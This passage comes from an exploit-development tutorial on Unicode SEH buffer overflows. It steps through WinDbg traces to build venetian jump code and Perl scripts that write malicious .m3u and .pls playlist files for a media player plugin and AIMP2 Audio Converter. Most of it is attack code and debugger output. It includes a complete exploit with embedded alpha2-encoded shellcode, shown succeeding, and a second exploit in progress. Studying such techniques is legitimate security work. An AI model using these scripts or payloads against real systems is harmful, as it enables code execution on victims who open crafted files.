!exchain\n0012f2ac: ***\nimage00400000+50015 (00450015)\nInvalid exception stack at 00620061\n0:000> bp 00450015\n0:000> bp 0012f2ac\n0:000> g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=00450015 esp=0012e47c ebp=0012e49c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nimage00400000+0x50015:\n00450015 5b              pop     ebx\n0:000> t\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=00450016 esp=0012e480 ebp=0012e49c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nimage00400000+0x50016:\n00450016 5d              pop     ebp\n0:000> t\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=00450017 esp=0012e484 ebp=0012e564 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nimage00400000+0x50017:\n00450017 c3              ret\n0:000> t\nBreakpoint 1 hit\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=0012f2ac esp=0012e488 ebp=0012e564 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12f2ab:\n0012f2ac 61              popad\n0:000> t\neax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2ad esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12f2ac:\n0012f2ad 006200          add     byte ptr [edx],ah          ds:0023:0012e54c=b8\n0:000> t\neax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b0 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei ng nz na po cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200283\n+0x12f2af:\n0012f2b0 1500450044      adc     eax,offset +0x440044ff (44004500)\nThat works.  popad has put something in all registers, and the 006200\ninstruction acted as some kind of nop.\nNote : What usually works best at nseh is a single byte instruction + a\nnop-alike instruction. There are many single byte instructions (inc ,\ndec , popad), so you should play a little with the instructions until\nyou get what you want.\nThe last instruction in the output above shows the next instruction,\nwhich is made up of the pointer to pop\/pop\/ret (15004500), and\napparently one additional byte is taken from the data that sits on the\nstack right after SE Handler (44).  Our pointer 00450015 is now\nconverted into an instruction that consists of opcode 15 = adc eax,\nfollowed by an 4 byte offset.  (The next byte from the stack was taken\nto align the instruction. We control that next byte, it\u2019s not a big\nissue)\nNow we try to execute what used to be a pointer to pop pop ret.  If we\ncan get past the execution of these bytes, and can start executing\nopcodes after these 4 bytes, then we have achieved the same thing as if\nwe would have ran jumpcode at nSEH.\nContinue to step (trace) through, and you\u2019ll end up here :\n0:000> t\neax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b0 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei ng nz na po cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200283\n+0x12f2af:\n0012f2b0 1500450044      adc     eax,offset +0x440044ff (44004500)\n0:000> t\neax=44132a65 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b5 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12f2b4:\n0012f2b5 00440044        add     byte ptr [eax+eax+44h],al  ds:0023:8826550e=??\nAha, so we have started to execute code that was put on the stack after\noverwriting SE Structure.\nWe basically tried to run 0044000044, which are D\u2019s.\nConclusion :\n\u2013 we have overwritten SE structure,\n\u2013 owned EIP (pop pop ret),\n\u2013 simulated a short jump\n\u2013 made the application run arbitrary code.\nThe next challenge is to turn this into a working exploit. We cannot\njust put our encoded shellcode here, because the decoder needs to have\na register that points at itself. If you look at the current register\nvalues, there are a lot of registers that point almost at the current\nlocation, but none of them points directly at the current location.  So\nwe need to modify one of the registers, and use some padding to put the\nshellcode exactly where it needs to be.\nLet\u2019s say we want to use eax.  We know how to build shellcode that uses\neax with alpha2 (which only requires one register).  If you want to use\nvense.pl, then you would need to prepare an additional register, make\nit point to a memory location that is writable and executable\u2026  but the\nbasic concept is the same.\nAnyways, back to using the alpha2 generated code. What we need to do is\npoint eax at the location that points at the first byte of our decoder\n(=encoded shellcode) and then jump to eax.\nFurthermore, the instructions that we will need to write, must be\nunicode compatible. So we need to use the venetian shellcode technique\nthat was explained earlier.\nLook at the registers. We could, for example, put ebp in eax and then\nadd a small number of bytes, to jump over the code that is needed to\npoint eax to the decoder and jump to it.\nWe\u2019ll probably need to add some padding between this code and the\nbeginning of the decoder, (so the end result would be that eax points\nat the decoder, when the jump is made)\nWhen we put ebp in eax and add 100 bytes, eax will point to 0012f3ac.\nThat\u2019s where the decoder needs to be placed at.\nWe control the data at that location :\n0:000> d 0012f3ac\n0012f3ac  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3bc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\nIn order to get ebp+100 into eax, and to jump to eax, we need the\nfollowing code :\npush ebp\npop eax\nadd eax,0x11001400\nsub eax,0x11001300\npush eax\nret\nAfter applying the venetian shellcode technique, this is what needs to\nbe put in the buffer :\nmy $preparestuff=\"D\";   #we need the first D\n$preparestuff=$preparestuff.\"\\x6e\";  #nop\/align\n$preparestuff=$preparestuff.\"\\x55\";  #push ebp\n$preparestuff=$preparestuff.\"\\x6e\";  #nop\/align\n$preparestuff=$preparestuff.\"\\x58\";  #pop eax\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\n$preparestuff=$preparestuff.\"\\x05\\x14\\x11\";   #add eax,0x11001400\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\n$preparestuff=$preparestuff.\"\\x2d\\x13\\x11\";   #sub eax,0x11001300\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\nAs we have seen, we need the first D because that byte is used as part\nof the offset in the instruction that is executed at SE Handler.\nAfter that instruction, we prepare eax so it would point to 0x0012f3ac,\nand we can make the jump to eax :\nCode :\nmy $totalsize=5000;\nmy $junk = \"A\" x 254;\nmy $nseh=\"\\x61\\x62\";  #popad + nop\nmy $seh=\"\\x15\\x45\";   #put 00450015 in SE Handler\nmy $preparestuff=\"D\";   #we need the first D\n$preparestuff=$preparestuff.\"\\x6e\";  #nop\/align\n$preparestuff=$preparestuff.\"\\x55\";  #push ebp\n$preparestuff=$preparestuff.\"\\x6e\";  #nop\/align\n$preparestuff=$preparestuff.\"\\x58\";  #pop eax\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\n$preparestuff=$preparestuff.\"\\x05\\x14\\x11\";   #add eax,0x11001400\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\n$preparestuff=$preparestuff.\"\\x2d\\x13\\x11\";   #sub eax,0x11001300\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\nmy $jump = \"\\x50\";  #push eax\n$jump=$jump.\"\\x6d\"; #nop\/align\n$jump=$jump.\"\\xc3\"; #ret\nmy $morestuff=\"D\" x (5000-length($junk.$nseh.$seh.$preparestuff.$jump));\n$payload=$junk.$nseh.$seh.$preparestuff.$jump.$morestuff;\nopen(myfile,'>corelantest.m3u');\nprint myfile $payload;\nclose(myfile);\nprint \"Wrote \".length($payload).\" bytes\\n\";\nResult :\nThis exception may be expected and handled.\neax=00000044 ebx=02ee2c84 ecx=02dbc588 edx=00130000 esi=02ee2c68 edi=0012f298\neip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\nDefaultPlaylist!XionPluginCreate+0x18776:\n01aec2a6 668902          mov     word ptr [edx],ax        ds:0023:00130000=6341\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n0:000> !exchain\n0012f2ac:\nimage00400000+50015 (00450015)\nInvalid exception stack at 00620061\n0:000> bp 0012f2ac\n0:000> g\nBreakpoint 0 hit\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=0012f2ac esp=0012e488 ebp=0012e564 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12f2ab:\n0012f2ac 61              popad\n0:000> t\neax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2ad esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12f2ac:\n0012f2ad 006200          add     byte ptr [edx],ah          ds:0023:0012e54c=b8\n0:000>\neax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b0 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei ng nz na po cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200283\n+0x12f2af:\n0012f2b0 1500450044      adc     eax,offset +0x440044ff (44004500)\n0:000>\neax=44132a65 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b5 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12f2b4:\n0012f2b5 006e00          add     byte ptr [esi],ch          ds:0023:0012e538=63\n0:000>\neax=44132a65 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b8 esp=0012e4a8 ebp=0012f2ac iopl=0         ov up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200a86\n+0x12f2b7:\n0012f2b8 55              push    ebp\n0:000>\neax=44132a65 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2b9 esp=0012e4a4 ebp=0012f2ac iopl=0         ov up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200a86\n+0x12f2b8:\n0012f2b9 006e00          add     byte ptr [esi],ch          ds:0023:0012e538=95\n0:000>\neax=44132a65 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2bc esp=0012e4a4 ebp=0012f2ac iopl=0         nv up ei ng nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200282\n+0x12f2bb:\n0012f2bc 58              pop     eax\n0:000>\neax=0012f2ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2bd esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei ng nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200282\n+0x12f2bc:\n0012f2bd 006e00          add     byte ptr [esi],ch          ds:0023:0012e538=c7\n0:000>\neax=0012f2ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2c0 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200286\n+0x12f2bf:\n0012f2c0 0500140011      add     eax,offset BASS+0x1400 (11001400)\n0:000>\neax=111306ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2c5 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12f2c4:\n0012f2c5 006e00          add     byte ptr [esi],ch          ds:0023:0012e538=f9\n0:000>\neax=111306ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2c8 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl nz na pe cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200207\n+0x12f2c7:\n0012f2c8 2d00130011      sub     eax,offset BASS+0x1300 (11001300)\n0:000>\neax=0012f3ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2cd esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12f2cc:\n0012f2cd 006e00          add     byte ptr [esi],ch          ds:0023:0012e538=2b\n0:000> d eax\n0012f3ac  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3bc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3cc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3dc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3ec  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3fc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f40c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f41c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0:000> t\neax=0012f3ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2d0 esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202\n+0x12f2cf:\n0012f2d0 50              push    eax\n0:000> t\neax=0012f3ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2d1 esp=0012e4a4 ebp=0012f2ac iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202\n+0x12f2d0:\n0012f2d1 006d00          add     byte ptr [ebp],ch          ss:0023:0012f2ac=61\n0:000> t\neax=0012f3ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f2d4 esp=0012e4a4 ebp=0012f2ac iopl=0         nv up ei ng nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200282\n+0x12f2d3:\n0012f2d4 c3              ret\n0:000> t\neax=0012f3ac ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580\neip=0012f3ac esp=0012e4a8 ebp=0012f2ac iopl=0         nv up ei ng nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200282\n+0x12f3ab:\n0012f3ac 44              inc     esp\nOk, that worked\nSo now we need to put our shellcode in our payload, making sure it sits\nat 0012f3ac as well.  In order to do so, we need the offset between the\nlast instruction in our venetian jumpcode (c3 = ret) and 0012f3ac.\n0:000> d 0012f2d4\n0012f2d4  c3 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  ..D.D.D.D.D.D.D.\n0012f2e4  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2f4  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f304  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f314  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f324  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f334  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f344  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0:000> d\n0012f354  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f364  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f374  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f384  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f394  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3a4  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3b4  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3c4  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f3ac \u2013 0012f2d5 = 215 bytes.  Half of the required amount of bytes\nwill added by the unicode conversion, so we need to pad 107 bytes\n(which will be automatically expanded to 214 bytes), then put our\nshellcode, and then put more junk (to trigger the exception that\neventually leads to triggering our code)\nCode :\nmy $totalsize=5000;\nmy $junk = \"A\" x 254;\nmy $nseh=\"\\x61\\x62\";  #popad + nop\nmy $seh=\"\\x15\\x45\";   #put 00450015 in SE Handler\nmy $preparestuff=\"D\";   #we need the first D\n$preparestuff=$preparestuff.\"\\x6e\";  #nop\/align\n$preparestuff=$preparestuff.\"\\x55\";  #push ebp\n$preparestuff=$preparestuff.\"\\x6e\";  #nop\/align\n$preparestuff=$preparestuff.\"\\x58\";  #pop eax\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\n$preparestuff=$preparestuff.\"\\x05\\x14\\x11\";   #add eax,0x11001400\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\n$preparestuff=$preparestuff.\"\\x2d\\x13\\x11\";   #sub eax,0x11001300\n$preparestuff=$preparestuff.\"\\x6e\";  #pop\/align\nmy $jump = \"\\x50\";  #push eax\n$jump=$jump.\"\\x6d\"; #nop\/align\n$jump=$jump.\"\\xc3\"; #ret\nmy $morestuff=\"D\" x 107;  #required to make sure shellcode = eax\nmy $shellcode=\"PPYAIAIAIAIAQATAXAZAPA3QADAZA\".\n\"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA\".\n\"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB\".\n\"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K\".\n\"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL\".\n\"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55\".\n\"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V\".\n\"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB\".\n\"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT\".\n\"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU\".\n\"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM\".\n\"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC\".\n\"QQ2LRCM0LJA\";\nmy $evenmorestuff=\"D\" x 4100;  #just a guess\n$payload=$junk.$nseh.$seh.$preparestuff.$jump.$morestuff.$shellcode.$evenmorestu\nff;\nopen(myfile,'>corelantest.m3u');\nprint myfile $payload;\nclose(myfile);\nprint \"Wrote \".length($payload).\" bytes\\n\";\nResult :\n[76]image\n0wned !\nBuilding a unicode exploit \u2013 Example 2\nIn our first example, we got somewhat lucky. The available buffer space\nallowed us to use a 524 byte shellcode, placed after overwriting the\nSEH record. In fact, 524 bytes is fairly small for unicode shellcode\u2026\nWe may not get this lucky every time.\nIn the second example, I\u2019ll discuss the first steps to building a\nworking exploit for AIMP2 Audio Converter 2.51 build 330 (and below),\n[77]as reported by mr_me.\nYou can download the vulnerable application [78]here. (The vulnerable\napplication is aimp2c.exe). When loading a specially crafted playlist\nfile, and pressing the \u201cPlay\u201d button, the application crashes :\nPoc Code :\nmy $header = \"\\nNumberOfEntries=1\\n\\n\";\n$header=$header.\"File1=\";\nmy $junk=\"A\" x 5000;\nmy $payload=$header.$junk.\"\\n\";\nopen(myfile,'>aimp2sploit.pls');\nprint myfile $payload;\nprint \"Wrote \" . length($payload).\" bytes\\n\";\nclose(myfile);\nResult :\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=001c0020 ebx=00000000 ecx=00000277 edx=00000c48 esi=001d1a58 edi=00130000\neip=004530c6 esp=0012dca8 ebp=0012dd64 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210216\nAIMP2!SysutilsWideFormatBuf$qqrpvuipxvuipx14SystemTVarRecxi+0xe2:\n004530c6 f366a5          rep movs word ptr es:[edi],word ptr [esi]\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n0:000> !exchain\n0012fda0: *** WARNING: Unable to verify checksum for image00400000\nimage00400000+10041 (00410041)\nInvalid exception stack at 00410041\nUsing a metasploit pattern, I have discovered that, on my system, the\noffset to hit the SEH record is 4065 bytes. After searching for Unicode\ncompatible pop pop ret addresses, I decided to use 0x0045000E\n(aimp2.dll).\nWe\u2019ll overwrite next SEH with 0x41,0x6d  (inc ecx + nop), and put 1000\nB\u2019s after overwriting the SEH record :\nCode :\nmy $header = \"\\nNumberOfEntries=1\\n\\n\";\n$header=$header.\"File1=\";\nmy $junk=\"A\" x 4065;\nmy $nseh=\"\\x41\\x6d\";   # inc ecx + add byte ptr [ebp],ch\nmy $seh=\"\\x0e\\x45\";  #0045000E  aimp2.dll Universal ? =>  push cs +  add byte pt\nr [ebp],al\nmy $rest = \"B\" x 1000;\nmy $payload=$header.$junk.$nseh.$seh.$rest.\"\\n\";\nopen(myfile,'>aimp2sploit.pls');\nprint myfile $payload;\nprint \"Wrote \" . length($payload).\" bytes\\n\";\nclose(myfile);\nResult :\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=001c0020 ebx=00000000 ecx=000002bc edx=00000c03 esi=001c7d88 edi=00130000\neip=004530c6 esp=0012dca8 ebp=0012dd64 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210216\nAIMP2!SysutilsWideFormatBuf$qqrpvuipxvuipx14SystemTVarRecxi+0xe2:\n004530c6 f366a5          rep movs word ptr es:[edi],word ptr [esi]\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n0:000> !exchain\n0012fda0: AIMP2!SysutilsWideLowerCase$qqrx17SystemWideString+c2 (0045000e)\nInvalid exception stack at 006d0041\n0:000> bp 0012fda0\n0:000> g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=7c9032a8 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fda0 esp=0012d8e4 ebp=0012d9c0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12fd8f:\n0012fda0 41              inc     ecx\n0:000> t\neax=00000000 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fda1 esp=0012d8e4 ebp=0012d9c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12fd90:\n0012fda1 006d00          add     byte ptr [ebp],ch          ss:0023:0012d9c0=05\n0:000> t\neax=00000000 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fda4 esp=0012d8e4 ebp=0012d9c0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202\n+0x12fd93:\n0012fda4 0e              push    cs\n0:000> t\neax=00000000 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fda5 esp=0012d8e0 ebp=0012d9c0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202\n+0x12fd94:\n0012fda5 004500          add     byte ptr [ebp],al          ss:0023:0012d9c0=37\n0:000> t\neax=00000000 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fda8 esp=0012d8e0 ebp=0012d9c0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202\n+0x12fd97:\n0012fda8 42              inc     edx\n0:000> d eip\n0012fda8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdb8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdc8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdd8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fde8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdf8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fe08  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fe18  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\nok, so far so good. We\u2019ve made the jump. Now we\u2019ll try to put an\naddress at eax, which points into our B\u2019s.\nWhen looking at the registers, we cannot find any register that can\nreally help us.  But if we look at what is on the stack at this point\n(at esp), we can see this :\n0:000> d esp\n0012d8e0  1b 00 12 00 dc d9 12 00-94 d9 12 00 a0 fd 12 00  ................\n0012d8f0  bc 32 90 7c a0 fd 12 00-a8 d9 12 00 7a 32 90 7c  .2.|........z2.|\n0012d900  c0 d9 12 00 a0 fd 12 00-dc d9 12 00 94 d9 12 00  ................\n0012d910  0e 00 45 00 00 00 13 00-c0 d9 12 00 a0 fd 12 00  ..E.............\n0012d920  0f aa 92 7c c0 d9 12 00-a0 fd 12 00 dc d9 12 00  ...|............\n0012d930  94 d9 12 00 0e 00 45 00-00 00 13 00 c0 d9 12 00  ......E.........\n0012d940  88 7d 1c 00 90 2d 1b 00-47 00 00 00 00 00 15 00  .}...-..G.......\n0012d950  37 00 00 00 8c 20 00 00-e8 73 19 00 00 00 00 00  7.... ...s......\n0:000> d 0012001b\n0012001b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012002b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012003b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012004b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012005b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012006b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012007b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0012008b  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0:000> d 0012d9dc\n0012d9dc  3f 00 01 00 00 00 00 00-00 00 00 00 00 00 00 00  ?...............\n0012d9ec  00 00 00 00 00 00 00 00-00 00 00 00 72 12 ff ff  ............r...\n0012d9fc  00 30 ff ff ff ff ff ff-20 53 84 74 1b 00 5b 05  .0...... S.t..[.\n0012da0c  28 ad 38 00 23 00 ff ff-00 00 00 00 00 00 00 00  (.8.#...........\n0012da1c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n0012da2c  00 00 00 00 00 00 48 53-6b bc 80 ff 12 00 00 d0  ......HSk.......\n0012da3c  2c 00 00 00 90 24 4e 80-00 00 00 40 00 dc 00 c2  ,....$N....@....\n0012da4c  00 da 35 40 86 74 b8 e6-e0 d8 de d2 3d 40 00 00  ..5@.t......=@..\n0:000> d 0012d994\n0012d994  ff ff ff ff 00 00 00 00-00 00 13 00 00 10 12 00  ................\n0012d9a4  08 06 15 00 64 dd 12 00-8a e4 90 7c 00 00 00 00  ....d......|....\n0012d9b4  dc d9 12 00 c0 d9 12 00-dc d9 12 00 37 00 00 c0  ............7...\n0012d9c4  00 00 00 00 00 00 00 00-c6 30 45 00 